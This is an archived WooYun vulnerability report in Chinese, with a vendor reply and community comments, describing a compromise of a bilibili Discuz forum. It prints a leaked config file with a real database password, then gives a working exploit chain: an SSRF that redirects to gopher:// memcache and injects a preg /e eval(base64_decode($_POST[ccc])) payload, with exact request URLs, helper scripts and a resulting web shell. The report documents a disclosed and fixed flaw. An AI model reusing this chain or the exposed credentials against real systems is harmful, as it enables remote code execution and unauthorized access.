{"id": 88183, "wybug_id": "wooyun-2016-0213982", "wybug_title": "bilibili某分站从信息泄露到ssrf再到命令执行                                      ", "wybug_corp": "bilibili.com", "wybug_author": "Jannock", "wybug_date": "2016-05-30 08:38", "wybug_open_date": "2016-06-27 18:00", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经修复", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-05-30：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-05-30：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-06-09：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-06-19：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-06-27：\t厂商已经修复漏洞并主动公开，细节向公众公开  简要描述： bilibili某分站从信息泄露到ssrf再到命令执行，今天来说说一个关于discuz的神洞，有必要的话稍后再提交给官方。 详细说明：  这个只是memcache的案例，如果是redis更好利用了0x00 前言扫描器时常会扫描到一些信息泄露，如discuz的配置文件 /config/config_global.php~ 里面时常带有数据库密码等，但又苦于内网，十分尴尬。0x01 个例分析以bilibili这个为例http://bbs.biligame.com/config/config_global.php~ \n\n\n<?php$_config = array();// ----------------------------  CONFIG DB  ----------------------------- //$_config['db']['1']['dbhost'] = '192.168.10.10';$_config['db']['1']['dbuser'] = 'gamebbs';$_config['db']['1']['dbpw'] = 'HdUbOY2YCAoKi3U0';$_config['db']['1']['dbcharset'] = 'utf8';$_config['db']['1']['pconnect'] = '0';                                   //此处禁止修改！$_config['db']['1']['dbname'] = 'gamebbs';$_config['db']['1']['tablepre'] = 'bbs_';$_config['db']['slave'] = '';$_config['db']['common']['slave_except_table'] = '';// --------------------------  CONFIG MEMORY  --------------------------- //$_config['memory']['prefix'] = 'NTOSSw_';$_config['memory']['redis']['server'] = '';$_config['memory']['redis']['port'] = 6379;$_config['memory']['redis']['pconnect'] = 1;$_config['memory']['redis']['timeout'] = '0';$_config['memory']['redis']['requirepass'] = '';$_config['memory']['redis']['serializer'] = 1;$_config['memory']['memcache']['server'] = '192.168.10.12';$_config['memory']['memcache']['port'] = 11211;$_config['memory']['memcache']['pconnect'] = 1;$_config['memory']['memcache']['timeout'] = 1;$_config['memory']['apc'] = 0;$_config['memory']['xcache'] = 0;$_config['memory']['eaccelerator'] = 0;$_config['memory']['wincache'] = 0;\n注意到使用了 memcache如果有留意到 vBulletin rce  http://drops.wooyun.org/papers/8261，相信都被这个漏洞的巧妙之处所吸引。那么，这discuz是否也存在同样的漏洞呢？于是查找调用缓存的地方\\source\\function\\function_core.php\nfunction output_replace($content) {\tglobal $_G;\tif(defined('IN_MODCP') || defined('IN_ADMINCP')) return $content;\tif(!empty($_G['setting']['output']['str']['search'])) {\t\tif(empty($_G['setting']['domain']['app']['default'])) {\t\t\t$_G['setting']['output']['str']['replace'] = str_replace('{CURHOST}', $_G['siteurl'], $_G['setting']['output']['str']['replace']);\t\t}\t\t$content = str_replace($_G['setting']['output']['str']['search'], $_G['setting']['output']['str']['replace'], $content);\t}\tif(!empty($_G['setting']['output']['preg']['search']) && (empty($_G['setting']['rewriteguest']) || empty($_G['uid']))) {\t\tif(empty($_G['setting']['domain']['app']['default'])) {\t\t\t$_G['setting']['output']['preg']['search'] = str_replace('\\{CURHOST\\}', preg_quote($_G['siteurl'], '/'), $_G['setting']['output']['preg']['search']);\t\t\t$_G['setting']['output']['preg']['replace'] = str_replace('{CURHOST}', $_G['siteurl'], $_G['setting']['output']['preg']['replace']);\t\t}\t\t$content = preg_replace($_G['setting']['output']['preg']['search'], $_G['setting']['output']['preg']['replace'], $content);\t}\treturn $content;}\n真发现有一处。这里的$_G['setting']['output']['preg']['search'] 和 $_G['setting']['output']['preg']['replace']是直接调用缓存中的数据。并且，discuz的ssrf是存在多处的，并且官方估计也很难去修复。 WooYun: Discuz!另一处SSRF无须登陆无须条件 于是测试，居然发现服务器支持gohper 协议呀。下面说说利用过程吧。discuz的漏洞详细分析有必要的话稍后再提交给官方。   漏洞证明：  0x02 漏洞利用测试利用转发代码\n<?phpheader('Location: gopher://自己服务器:80/_%0d%0aset NTOSSw_setting 1 0 147%0d%0aa:2:{s:6:\"output\";a:1:{s:4:\"preg\";a:2:{s:6:\"search\";s:5:\"/.*/e\";s:7:\"replace\";s:33:\"eval(base64_decode($_POST[ccc]));\";}}s:13:\"rewritestatus\";i:1;}%0d%0a');?>\n测试返回如下图\n\n\n\n万事俱备了，行动先准备好两个页面，便于写完shell后还原。wshell.php\n<?phpheader('Location: gopher://192.168.10.12:11211/_%0d%0aset NTOSSw_setting 1 0 147%0d%0aa:2:{s:6:\"output\";a:1:{s:4:\"preg\";a:2:{s:6:\"search\";s:5:\"/.*/e\";s:7:\"replace\";s:33:\"eval(base64_decode($_POST[ccc]));\";}}s:13:\"rewritestatus\";i:1;}%0d%0a');?>\ncls.php\n<?phpheader('Location: gopher://192.168.10.12:11211/_%0d%0adelete NTOSSw_setting%0d%0a');?>\n请求http://bbs.biligame.com/forum.php?mod=ajax&action=downremoteimg&message=[img]http://myserver/wshell.php?logo.jpg[/img]完成后，立即请求shell地址http://bbs.biligame.com/forum.php?mod=ajax&inajax=yes&action=getthreadtypes从上面可知，这是一句话，由于要绕过waf，所以base64一下。\n\n写入文件shellhttp://bbs.biligame.com/forum.php?mod=ajax&action=downremoteimg&message=[img]http://myserver/cls.php?logo.jpg[/img]还原缓存最后一句话地址为：http://bbs.biligame.com/data/cache/hello.php\n\n   修复方案：  防止信息泄露，防止ssrf。   版权声明：转载请注明来源 Jannock@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2016-05-30 09:22 厂商回复： 为什么被怼了我还这么愉♂悦(ﾟДﾟ≡ﾟдﾟ)!?~因为是爱豆怼的吗？ 最新状态： 2016-05-30：这是0day~这是0day~ 2016-06-27：fixed  ", "replys": "漏洞评价：\n评价\n     2016-05-30 08:40 |    \t\t带头大哥 \t\t\t( 普通白帽子  |\t\t\t        Rank:879 漏洞数:258        | |任意邮件伪造| |目录遍历| |任意文件读取|...)\t\t \n  膜拜..    \n     2016-05-30 08:46 |    \t\t大师兄 \t\t\t( 实习白帽子  |\t\t\t        Rank:31 漏洞数:8        | 每日必关注乌云)\t\t \n  静观厂商反怼！    \n     2016-05-30 08:54 |    \t\t路人毛 \t\t\t( 普通白帽子  |\t\t\t        Rank:157 漏洞数:64        | 要想Rank给高，标题一定得屌)\t\t \n  静观厂商反怼！    \n     2016-05-30 09:00 |    \t\t猪猪侠  \t\t\t( 核心白帽子 |\t\t\t        Rank:5372 漏洞数:415        | 你都有那么多超级棒棒糖了，还要自由干吗？)\t\t \n  静观厂商反怼！    \n     2016-05-30 09:07 |    \t\t子非海绵宝宝  \t\t\t( 核心白帽子 |\t\t\t        Rank:1413 漏洞数:148        | 发扬海绵宝宝的精神!你不是海绵宝宝,你怎...)\t\t \n  静观厂商反怼！    \n     2016-05-30 09:13 |    \t\tSH0X8001 \t\t\t( 路人 |\t\t\t        Rank:25 漏洞数:6        | 你猜)\t\t \n  静观厂商反怼！     \n     2016-05-30 09:13 |    \t\tMe_Fortune \t\t\t( 普通白帽子  |\t\t\t        Rank:361 漏洞数:115        | The quiter you are,the more you're able ...)\t\t \n  静观厂商反怼！     \n     2016-05-30 09:14 |    \t\tVinc \t\t\t( 普通白帽子  |\t\t\t        Rank:383 漏洞数:58        | 提莫队长正在待命！)\t\t \n  静观厂商反怼！    \n     2016-05-30 09:14 |    \t\tx7iao \t\t\t( 普通白帽子  |\t\t\t        Rank:395 漏洞数:56        | 文能床上控萝莉，武能床上定人妻)\t\t \n  静观厂商反怼！    \n     2016-05-30 09:15 |    \t\tRaven \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:4        | See You Again)\t\t \n  静观厂商反怼！    \n     2016-05-30 09:17 |    \t\tgreg.wu \t\t\t( 普通白帽子  |\t\t\t        Rank:1044 漏洞数:121        | 打酱油的~)\t\t \n  一哥威武    \n     2016-05-30 09:21 |    \t\thecate \t\t\t( 普通白帽子  |\t\t\t        Rank:849 漏洞数:131        | ®高级安全工程师 | WooYun认证√)\t\t \n  静观厂商反怼！    \n     2016-05-30 09:22 |    \t\tzzR  \t\t\t( 核心白帽子 |\t\t\t        Rank:1408 漏洞数:127        | 东方红＊＊联盟欢迎你－0-)\t\t \n  make yige    \n     2016-05-30 09:24 |    \t\tRicter \t\t\t( 普通白帽子  |\t\t\t        Rank:106 漏洞数:20        | 渣渣一个)\t\t \n  这个洞屌啊。。    \n     2016-05-30 09:34 |    \t\tSai、 \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:4        | for fun……)\t\t \n  静观厂商反怼！    \n     2016-05-30 09:35 |    \t\t红客十年 \t\t\t( 普通白帽子  |\t\t\t        Rank:392 漏洞数:80        | 去年离职富士康，回到家中上蓝翔，蓝翔毕业...)\t\t \n  静观厂商反怼！    \n     2016-05-30 09:45 |    \t\tMel0d6y \t\t\t( 实习白帽子  |\t\t\t        Rank:77 漏洞数:16        | 迷失在未来的旅行者.              「H...)\t\t \n  静观厂商反怼！    \n     2016-05-30 09:46 |    \t\tqhwlpg \t\t\t( 普通白帽子  |\t\t\t        Rank:260 漏洞数:64        | http://sec.tuniu.com)\t\t \n  静观厂商反怼！    \n     2016-05-30 10:05 |    \t\tExplo1t \t\t\t( 路人 |\t\t\t        Rank:16 漏洞数:8        | 流生若川，不要小看人生啊！)\t\t \n  静观厂商反怼！    \n     2016-05-30 10:09 |    \t\tWenR0 \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:2        | ...)\t\t \n  静观厂商反怼！    \n     2016-05-30 12:46 |    \t\txtnnd \t\t\t( 普通白帽子  |\t\t\t        Rank:184 漏洞数:45        | t-safe)\t\t \n  hack by bilibili    \n     2016-05-30 13:09 |    \t\tAgony \t\t\t( 路人 |\t\t\t        Rank:24 漏洞数:12        | you know a cat has nine lives.)\t\t \n  静观厂商反怼！    \n     2016-05-30 15:05 |    \t\t围剿 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:5        | Evil decimal)\t\t \n  静观厂商反怼！    \n     2016-05-30 16:19 |    \t\tRainism \t\t\t( 路人 |\t\t\t        Rank:15 漏洞数:4        | hacking for fun)\t\t \n  静观厂商反怼！     \n     2016-05-30 22:57 |    \t\t0h1in9e \t\t\t( 实习白帽子  |\t\t\t        Rank:68 漏洞数:23        | 林歌 | 峨眉山下修炼中的<网络安全></web开...)\t\t \n  静观厂商反怼！    \n     2016-05-30 23:50 |    \t\tFire ant \t\t\t( 普通白帽子  |\t\t\t        Rank:108 漏洞数:35        | 他们回来了................)\t\t \n  静观厂商反怼！    \n     2016-05-31 09:04 |    \t\tAny3ite \t\t\t( 路人 |\t\t\t        Rank:26 漏洞数:12        | 土耳其web 国内的我就看看不说话)\t\t \n  静观厂商反怼！     \n     2016-05-31 10:59 |    \t\tCode Life \t\t\t( 普通白帽子  |\t\t\t        Rank:202 漏洞数:45        | Code Life,Join It!)\t\t \n  静观厂商反怼！    \n     2016-06-01 11:40 |    \t\tP0ker_L \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:2        | 趣果有间，孤独无解)\t\t \n  静观厂商反怼！    \n     2016-06-01 12:27 |    \t\t暗羽 \t\t\t( 路人 |\t\t\t        Rank:23 漏洞数:7        | 喵呜，给人类的智商跪了)\t\t \n  静观厂商反怼！    \n     2016-06-01 14:10 |    \t\t死寂幽兰 \t\t\t( 路人 |\t\t\t        Rank:1 漏洞数:1        | 找洞，找洞，还是找洞)\t\t \n  静观厂商反怼！     \n     2016-06-06 18:25 |    \t\t乌帽子 \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:3        | 学习黑客哪家强 | 中国山东找蓝翔 | sql...)\t\t \n  静观厂商反怼！    \n     2016-06-24 18:25 |    \t\t王松_Striker \t\t\t( 实习白帽子  |\t\t\t        Rank:33 漏洞数:5        | 专注于代码审计,但毛都不会。安全盒子（w...)\t\t \n  静观厂商反怼！    \n     2016-06-24 19:46 |    \t\tscanf \t\t\t( 核心白帽子 |\t\t\t        Rank:1698 漏洞数:240        | 。)\t\t \n  这个利用真是细心    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}